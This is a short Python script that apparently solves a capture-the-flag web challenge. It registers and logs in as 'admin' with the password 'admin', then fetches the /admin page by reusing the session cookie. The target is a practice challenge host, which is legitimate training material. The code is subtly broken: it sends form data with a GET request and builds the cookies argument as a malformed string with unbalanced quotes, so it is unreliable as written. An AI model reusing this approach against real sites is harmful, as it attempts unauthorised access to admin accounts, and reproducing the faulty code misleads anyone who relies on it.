import requests
site = "http://too-small-reminder.challs.olicyber.it"
s = requests.Session()
s.get(f"{site}/register", data="{'username':'admin', 'password':'admin'}")
s.post(f"{site}/login", data="{'username':'admin', 'password':'admin'}")
print(s.get(f"{site}/admin", cookies="{'session_id':'"+s.cookies["session_id"]).text)
